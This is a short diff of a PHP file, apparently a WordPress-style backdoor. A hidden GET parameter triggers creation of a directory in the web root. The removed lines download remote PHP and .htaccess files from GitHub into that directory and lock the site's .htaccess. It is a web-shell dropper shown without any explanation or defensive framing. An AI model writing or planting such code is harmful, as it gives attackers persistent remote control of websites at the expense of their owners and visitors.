@@ -3,20 +3,6 @@ if(isset($_GET["eec"])&&$_GET["eec"]=="sec"){
 mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-et");
 echo('Eec secra');  
 
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0755);
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-et", 0755);
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-et/.htaccess", 0644);
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-et/wp-supports.php", 0644);
-$filee = sexx('https://raw.githubusercontent.com/Hrecc/Re/main/.htaccess');
-$locall=$_SERVER['DOCUMENT_ROOT']."/cgi-et/.htaccess";
-if(file_put_contents($locall, $filee));  
-@chmod($_SERVER['DOCUMENT_ROOT'] . "/.htaccess", 0444);
-
-$file = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/nt');
-$local=$_SERVER['DOCUMENT_ROOT']."/cgi-et/wp-irealto.php";
-if(file_put_contents($local, $file));   
-
-
 die();  }
 
 $random = rand(1,6);
